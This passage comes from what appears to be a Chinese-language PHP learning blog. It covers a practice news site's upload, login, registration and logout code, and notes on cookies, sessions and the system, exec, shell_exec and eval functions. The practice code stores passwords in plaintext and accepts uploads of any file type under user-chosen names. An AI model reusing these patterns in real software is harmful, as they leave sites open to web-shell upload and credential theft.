&quot;&lt;script&gt;alert(\&quot;密码修改成功，请重新登录！\&quot;)&lt;/script&gt;&quot;;</span><br><span class="line">            //echo &quot;&lt;script&gt;location.href=&apos;../logout.php&apos;&lt;/script&gt;&quot;;</span><br><span class="line"></span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            echo &quot;&lt;script&gt;alert(\&quot;新密码不匹配，请重新输入！\&quot;)&lt;/script&gt;&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>修改密码界面：</p><p><img src="/images/chagePwd.png" alt></p><p><img src="/images/chagePwdIn.png" alt></p><p><img src="/images/chagePwdSec.png" alt></p><p><img src="/images/PwdInFile.png" alt></p><p>密码修改后登出账号，重新登录。</p><h3 id="五、上传头像-upload-php"><a href="#五、上传头像-upload-php" class="headerlink" title="五、上传头像 upload.php"></a>五、上传头像 upload.php</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php include &apos;../basedir/function.php&apos;; include &apos;../basedir/header.php&apos;; ?&gt;</span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;title&gt;上传图片&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">if($_SESSION[&apos;uname&apos;]==NULL)</span><br><span class="line">    echo &quot;&lt;script&gt;alert(&apos;请登录&apos;); location.href=&apos;../login.html&apos;&lt;/script&gt;&quot;;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;div align=&quot;center&quot;&gt;</span><br><span class="line">    &lt;a href=&quot;del.php&quot;&gt;删除新闻&lt;/a&gt;       &amp;nbsp  &amp;nbsp  &amp;nbsp  &amp;nbsp  &amp;nbsp</span><br><span class="line">    &lt;a href=&quot;../data/addNews.php&quot;&gt;添加新闻&lt;/a&gt;      &amp;nbsp  &amp;nbsp  &amp;nbsp  &amp;nbsp  &amp;nbsp</span><br><span class="line">    &lt;a href=&quot;getpasswd.php&quot;&gt;修改密码&lt;/a&gt;</span><br><span class="line">    &lt;br&gt;&lt;br&gt;&lt;br&gt;</span><br><span class="line">    &lt;form action=&quot;upload.php&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;</span><br><span class="line">        &lt;label&gt;文件名：&lt;/label&gt;</span><br><span class="line">        &lt;input type=&quot;file&quot; name=&quot;file&quot; &gt;&lt;br&gt;</span><br><span class="line">        &lt;input type=&quot;text&quot; name=&quot;title&quot;&gt;&lt;br&gt;</span><br><span class="line">        &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;提交&quot;&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">if(isset($_POST[&apos;submit&apos;]))&#123;</span><br><span class="line">    $name       = $_FILES[&apos;file&apos;][&apos;name&apos;];</span><br><span class="line">    $temp_name  = $_FILES[&apos;file&apos;][&apos;tmp_name&apos;];</span><br><span class="line">    if(isset($name))&#123;</span><br><span class="line">        if(!empty($name))&#123;</span><br><span class="line">            $location = &quot;../upload/&quot;;</span><br><span class="line">            $path = $location . $name;</span><br><span class="line">            if(move_uploaded_file($temp_name, $location.$name))&#123;</span><br><span class="line">                $_SESSION[&apos;headImg&apos;] = $path;</span><br><span class="line">                echo &apos;File uploaded successfully&apos;;</span><br><span class="line">                echo &lt;&lt;&lt;EOF</span><br><span class="line">                &lt;div align=&quot;center&quot;&gt;</span><br><span class="line">                    &lt;img src=$path&gt;   </span><br><span class="line">                &lt;/div&gt;</span><br><span class="line">EOF;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;  else &#123;</span><br><span class="line">        echo &apos;You should select a file to upload !!&apos;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;?php include &apos;../basedir/footer.php&apos;?&gt;</span><br></pre></td></tr></table></figure><p>上传头像界面：</p><p><img src="/images/uploadImg.png" alt></p><p><img src="/images/uploadImgSec.png" alt></p><h3 id="六、退出账号-logout-php"><a href="#六、退出账号-logout-php" class="headerlink" title="六、退出账号 logout.php"></a>六、退出账号 logout.php</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">session_start();</span><br><span class="line">session_destroy();</span><br><span class="line">echo &quot;&lt;script&gt;alert(&apos;账号已退出&apos;); location.href=&apos;login.html&apos;&lt;/script&gt;&quot;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>在任何一个界面点击注销账号均能成功退出，重新返回用户登录界面</p><p><img src="/images/logout.png" alt></p><p>点击确定，返回用户登录界面。</p><h3 id="七、问题与总结"><a href="#七、问题与总结" class="headerlink" title="七、问题与总结"></a>七、问题与总结</h3><ol><li>目前的代码有些冗余，比如删除新闻和修改密码，都是把需要的信息读取出来，然后稍作处理再写回文件，可以在<code>function.php</code>文件里写一个函数，需要时直接调用函数就行；删除新闻界面和初始化界面都有展示新闻的功能，也可可以通过一个函数来实现展示。</li><li>对写入文件的内容判断不严谨，会把<code>\n</code>写入，文件内容间有空行时，统计总的<code>id</code>数会把空行也给统计进去，进而导致删除新闻时，不成功。把空行删完以后，才会执行成功。目前对文件操作<code>\n</code>理解不深，正在寻找方法解决。</li><li>代码移植性差，需要修改地方较多。</li></ol>]]></content>
      
      
      <categories>
          
          <category> Web Security </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
            <tag> 实战 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>note20</title>
      <link href="/2019/08/09/note20/"/>
      <url>/2019/08/09/note20/</url>
      
        <content type="html"><![CDATA[<p><strong>Abstract</strong>: 新闻界面添加新功能讲解，PHP中的Cookie和Session以及程序执行函数</p><a id="more"></a><!--export--><h3 id="一、PHP-Cookie"><a href="#一、PHP-Cookie" class="headerlink" title="一、PHP Cookie"></a>一、PHP Cookie</h3><p><code>cookie</code>常用于识别用户，是一种服务器留在用户计算机上的小文件。每当同一台计算机通过浏览器请求页面时，这台计算机将会发送<code>cookie</code>。</p><h4 id="1-如何创建Cookie"><a href="#1-如何创建Cookie" class="headerlink" title="1. 如何创建Cookie"></a>1. 如何创建Cookie</h4><p><code>setcookie()</code>函数用于设置<code>cookie</code> </p><p><strong>setcookie()函数必须位于<code>&lt;html&gt;</code>标签之前</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">/*</span><br><span class="line">setcookie(name, value, expire, path, domain)</span><br><span class="line">发送cookie时，cookie值会自动进行URL编码</span><br><span class="line">取回时进行自动解码</span><br><span class="line">*/</span><br><span class="line">setcookie(&quot;user&quot;, &quot;test&quot;, time()+3600);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h4 id="2-取回Cookie值"><a href="#2-取回Cookie值" class="headerlink" title="2. 取回Cookie值"></a>2. 取回Cookie值</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">//输出cookie值</span><br><span class="line">echo $_COOKIE[&quot;user&quot;];</span><br><span class="line">//查看所有cookie</span><br><span class="line">print_r($_COOKIE);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;head&gt;</span><br><span class="line">        &lt;meta charset=&quot;utf-8&quot;&gt;</span><br><span class="line">        &lt;title&gt;isset函数&lt;/title&gt;</span><br><span class="line">    &lt;/head&gt;</span><br><span class="line">    &lt;body&gt;</span><br><span class="line">        &lt;?php</span><br><span class="line">        if(isset($_COOKIE[&quot;user&quot;]))</span><br><span class="line">                echo &quot;欢迎&quot; . $_COOKIE[&quot;user&quot;] . &quot;!&lt;br&gt;&quot;;</span><br><span class="line">        else</span><br><span class="line">                echo &quot;普通访客！&lt;br&gt;&quot;;</span><br><span class="line">        ?&gt;</span><br><span class="line">    &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><h4 id="3-删除Cookie"><a href="#3-删除Cookie" class="headerlink" title="3. 删除Cookie"></a>3. 删除Cookie</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">//设置cookie过期时间为过去1小时</span><br><span class="line">setcookie(&quot;user&quot;, &quot;&quot;, time()-3600);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h3 id="二、PHP-Session"><a href="#二、PHP-Session" class="headerlink" title="二、PHP Session"></a>二、PHP Session</h3><p><code>PHP session</code>变量用于存储关于用户会话（session）信息，或者更改用户会话的设置，<code>Session</code>变量存储单一用户的信息，并且对于应用程序中的所有页面都是可用的。</p><h4 id="1-开始PHP-Session"><a href="#1-开始PHP-Session" class="headerlink" title="1. 开始PHP Session"></a>1. 开始PHP Session</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--session_start()函数必须位于&lt;html&gt;标签之前--&gt;</span><br><span class="line">&lt;?php session_start(); ?&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;body&gt;&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><h4 id="2-存储Session变量"><a href="#2-存储Session变量" class="headerlink" title="2.存储Session变量"></a>2.存储Session变量</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">session_start();</span><br><span class="line">//存储session数据</span><br><span class="line">$_SESSION[&apos;views&apos;]=1;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;head&gt;</span><br><span class="line">        &lt;meta charset=&quot;utf-8&quot;&gt;</span><br><span class="line">        &lt;title&gt;Session&lt;/title&gt;</span><br><span class="line">    &lt;/head&gt;</span><br><span class="line">    &lt;body&gt;</span><br><span class="line">        &lt;?php</span><br><span class="line">        //检索session数据</span><br><span class="line">        echo &quot;浏览量：&quot; . $_SESSION[&apos;views&apos;];</span><br><span class="line">        ?&gt;</span><br><span class="line">    &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>一个简单的<code>page-view</code>计数器</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">session_start();</span><br><span class="line">if(isset($_SESSION[&apos;views&apos;]))&#123;</span><br><span class="line">    $_SESSION[&apos;views&apos;] = $_SESSION[&apos;views&apos;] + 1;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    $_SESSION[&apos;views&apos;] = 1;</span><br><span class="line">&#125;</span><br><span class="line">echo &quot;浏览器：&quot; . $_SESSION[&apos;views&apos;];</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h4 id="3-销毁Session"><a href="#3-销毁Session" class="headerlink" title="3. 销毁Session"></a>3. 销毁Session</h4><p><code>unset()</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">session_start();</span><br><span class="line">if(isset($_SESSION[&apos;views&apos;]))&#123;</span><br><span class="line">    unset($_SESSION[&apos;views&apos;]);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p><code>session_destroy()</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">session_destroy();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>验证登录用户是否由<code>admin</code>权限</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">session_start();</span><br><span class="line">if(isset($_SESSION[&quot;admin&quot;]) &amp;&amp; $_SESSION[&quot;admin&quot;]== true)&#123;</span><br><span class="line">    echo &quot;您已成功登录&quot;;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    //验证失败</span><br><span class="line">    $_SESSION[&quot;admin&quot;] = false;</span><br><span class="line">    die(&quot;您无权访问&quot;);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h3 id="三、PHP包含文件"><a href="#三、PHP包含文件" class="headerlink" title="三、PHP包含文件"></a>三、PHP包含文件</h3><table><thead><tr><th align="left">语句</th><th>区别（处理错误方式不同）</th></tr></thead><tbody><tr><td align="left">require</td><td>生成一个致命错误(E_COMPILE_ERROR)，在错误发生后脚本停止执行</td></tr><tr><td align="left">include</td><td>生成一个警告(E_WARNING)，在错误发生后脚本会继续执行</td></tr></tbody></table><p>语法 <code>include &#39;filename&#39;;</code>  <code>require &#39;filename&#39;</code></p><ul><li>写一些功能性的函数，比如数据库查询，验证文件后缀是否是允许的。数据库删除，数据清洗waf</li><li>写配置信息，数据库连接地址，网站标题，网站作者</li><li>统一页面格式</li><li>做路由控制</li></ul><h3 id="四、PHP中程序执行函数"><a href="#四、PHP中程序执行函数" class="headerlink" title="四、PHP中程序执行函数"></a>四、PHP中程序执行函数</h3><h3 id="1-system"><a href="#1-system" class="headerlink" title="1. system"></a>1. system</h3><p><code>system</code> —执行外部程序，并且显示输出</p><p><code>system(command, return var)</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">system(&quot;pwd&quot;, $result);</span><br><span class="line">//输出命令的结果状态码</span><br><span class="line">echo $result;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h4 id="2-exec"><a href="#2-exec" class="headerlink" title="2. exec"></a>2. exec</h4><p><code>exec</code>—执行一个外部程序</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">echo exec(&quot;whoami&quot;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h4 id="3-shellexec"><a href="#3-shellexec" class="headerlink" title="3. shellexec"></a>3. shellexec</h4><p><code>shellexec</code>—通过shell环境执行命令并且将完整的输出以字符串的方式返回。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$output = shell_exec(&apos;ls -lart&apos;);</span><br><span class="line">echo $output;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h4 id="4-eval"><a href="#4-eval" class="headerlink" title="4. eval"></a>4. eval</h4><p><code>eval</code>把字符串按照php代码来计算</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$string = &apos;cup&apos;;</span><br><span class="line">$name = &apos;coffee&apos;;</span><br><span class="line">$str = &apos;This is a $string with my $name in it.&apos;;</span><br><span class="line">echo $str . &quot;\n&quot;;</span><br><span class="line">eval(&quot;\$str = \&quot;$str\&quot;;&quot;);</span><br><span class="line">echo $str . &quot;\n&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h4 id="5-assert"><a href="#5-assert" class="headerlink" title="5. assert"></a>5. assert</h4><p><code>assert</code>检查一个断言是否为<code>FALSE</code></p>]]></content>
      
      
      <categories>
          
          <category> Web Security </category>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>练习4</title>
      <link href="/2019/08/09/practice4/"/>
      <url>/2019/08/09/practice4/</url>
      
        <content type="html"><![CDATA[<p><strong>Abstract</strong>: 新闻界面新增用户登录和注册功能，以及在编写过程中遇到的问题与解决</p><a id="more"></a><!--export--><h3 id="一、用户登录"><a href="#一、用户登录" class="headerlink" title="一、用户登录"></a>一、用户登录</h3><h4 id="1-用户登录界面-signin-php"><a href="#1-用户登录界面-signin-php" class="headerlink" title="1.用户登录界面 signin.php"></a>1.用户登录界面 signin.php</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;</span><br><span class="line">        登录</span><br><span class="line">    &lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;br&gt;&lt;br&gt;&lt;br&gt;</span><br><span class="line">&lt;h1 align=&quot;center&quot;&gt;登录&lt;/h1&gt;</span><br><span class="line">&lt;div align=&quot;center&quot;&gt;</span><br><span class="line">    &lt;br&gt;</span><br><span class="line">    &lt;form action=&quot;login.php&quot; method=&quot;post&quot;&gt;</span><br><span class="line">        &lt;input type=&quot;tel&quot; name=&quot;phonenumber&quot; placeholder=&quot;手机号&quot;&gt;</span><br><span class="line">        &lt;br&gt;</span><br><span class="line">        &lt;input type=&quot;password&quot; name=&quot;password&quot;&gt;</span><br><span class="line">        &lt;br&gt;</span><br><span class="line">        &lt;a href=&quot;signup.php&quot;&gt;注册账号&lt;/a&gt;</span><br><span class="line">        &lt;br&gt;</span><br><span class="line">        &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;提交&quot;&gt;</span><br><span class="line">        &lt;br&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p><img src="/images/signin.png" alt="用户登录界面"></p><h4 id="2-账号和密码处理-login-php"><a href="#2-账号和密码处理-login-php" class="headerlink" title="2.账号和密码处理 login.php"></a>2.账号和密码处理 login.php</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;</span><br><span class="line">        处理账号和密码</span><br><span class="line">    &lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">//打开存储用户信息的文件</span><br><span class="line">$fhandle = fopen(&apos;./data/users.db&apos;, &apos;r&apos;);</span><br><span class="line">//逐行读取数据</span><br><span class="line">while(!feof($fhandle)) &#123;</span><br><span class="line">    $InMes = fgets($fhandle);</span><br><span class="line">    $mesArray = explode(&apos;||&apos;, $InMes);</span><br><span class="line">    if(count($mesArray)!=2)&#123;</span><br><span class="line">        continue;</span><br><span class="line">    &#125;</span><br><span class="line">    if(trim($mesArray[0])==$_POST[&apos;phonenumber&apos;] &amp;&amp; trim($mesArray[1])==$_POST[&apos;password&apos;])&#123;</span><br><span class="line">        echo &quot;正在进入后台&quot;;</span><br><span class="line">        echo &lt;&lt;&lt;EOF</span><br><span class="line">        &lt;script&gt;location.href=&quot;./data/add_news.php&quot;&lt;/script&gt;</span><br><span class="line">EOF;</span><br><span class="line">        break;</span><br><span class="line">    &#125;</span><br><span class="line">    $flag = 1;</span><br><span class="line">//    else&#123;</span><br><span class="line">//        echo &quot;&lt;script&gt;alert(&apos;账号或密码错误！重新输入。&apos;)&lt;/script&gt;&quot;;</span><br><span class="line">//        echo &quot;&lt;script&gt;history.back()&lt;/script&gt;&quot;;</span><br><span class="line">//    &#125;</span><br><span class="line">&#125;</span><br><span class="line">//修改逻辑问题</span><br><span class="line">if($flag==1)&#123;</span><br><span class="line">    echo &quot;&lt;script&gt;alert(&apos;账号或密码错误！重新输入。&apos;)&lt;/script&gt;&quot;;</span><br><span class="line">    echo &quot;&lt;script&gt;history.back()&lt;/script&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p><strong>逻辑问题</strong>：注释掉的是第一次写完的，但判断逻辑是有问题的，逐行读取用户信息后，相同则跳回增加新闻界面，否则提示错误信息，重新输入账号或密码，这样会导致用户信息没有匹配成功前会一直报错。</p><p><strong>解决方法</strong>：在用户读完文件前不做出错判断，读完再判断，在判断匹配成功语句后添加一个标志位<code>flag</code>若值为<code>1</code>说明用户没有匹配成功，直接报错。，返回用户登录界面重新输入密码。</p><p><strong>格式问题</strong>：用户账号和密码匹配时一直匹配不对。</p><p><strong>解决方法</strong>：用<code>var_dump</code>把数据输出发现是相同的，但还是匹配不成功，想想有可能需要用<code>trim</code>函数处理下数据。</p><p><img src="/images/passwdError.png" alt></p><h3 id="二、用户注册"><a href="#二、用户注册" class="headerlink" title="二、用户注册"></a>二、用户注册</h3><h4 id="1-用户注册界面-signup-php"><a href="#1-用户注册界面-signup-php" class="headerlink" title="1.用户注册界面 signup.php"></a>1.用户注册界面 signup.php</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;</span><br><span class="line">        注册账号</span><br><span class="line">    &lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;div align=&quot;center&quot;&gt;</span><br><span class="line">        &lt;br&gt;&lt;br&gt;&lt;br&gt;</span><br><span class="line">        &lt;h2 align=&quot;center&quot;&gt;注册用户&lt;/h2&gt;</span><br><span class="line">        &lt;form action=&quot;./checkSignUp.php&quot; method=&quot;post&quot;&gt;</span><br><span class="line">            手机：&lt;input type=&quot;tel&quot; name=&quot;phonenumber&quot;placeholder=&quot;手机号&quot;&gt;</span><br><span class="line">            &lt;br&gt;</span><br><span class="line">            密码：&lt;input type=&quot;password&quot; name=&quot;password&quot;&gt;</span><br><span class="line">            &lt;br&gt;</span><br><span class="line">            确认：&lt;input type=&quot;password&quot; name=&quot;checkpasswd&quot;&gt;</span><br><span class="line">            &lt;br&gt;</span><br><span class="line">            &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;提交&quot;&gt;</span><br><span class="line">        &lt;/form&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p><img src="/images/signUp.png" alt="用户注册"></p><h4 id="2-用户注册数据处理"><a href="#2-用户注册数据处理" class="headerlink" title="2.用户注册数据处理"></a>2.用户注册数据处理</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$fhandle = fopen(&apos;./data/users.db&apos;, &apos;a+&apos;);</span><br><span class="line">$userMes = array();</span><br><span class="line">@$userMes[0] = $_POST[&apos;phonenumber&apos;];</span><br><span class="line">@$userMes[1]=$_POST[&apos;password&apos;];</span><br><span class="line">$inMes = implode(&apos;||&apos;, $userMes);</span><br><span class="line">//    var_dump($inMes);</span><br><span class="line">if(count($userMes)==2) &#123;</span><br><span class="line">    fputs($fhandle, $inMes . &quot;\n&quot;);</span><br><span class="line">    fclose($fhandle);</span><br><span class="line">    echo &quot;&lt;script&gt;alert(&apos;用户注册成功&apos;)&lt;/script&gt;&quot;;</span><br><span class="line">    echo &quot;&lt;script&gt;location.href=&apos;signin.php&apos;&lt;/script&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p><img src="/images/signUpSes.png" alt></p><p>注册成功自动跳转到用户登录界面</p><h3 id="三、添加新闻界面-add-news-php"><a href="#三、添加新闻界面-add-news-php" class="headerlink" title="三、添加新闻界面 add_news.php"></a>三、添加新闻界面 add_news.php</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 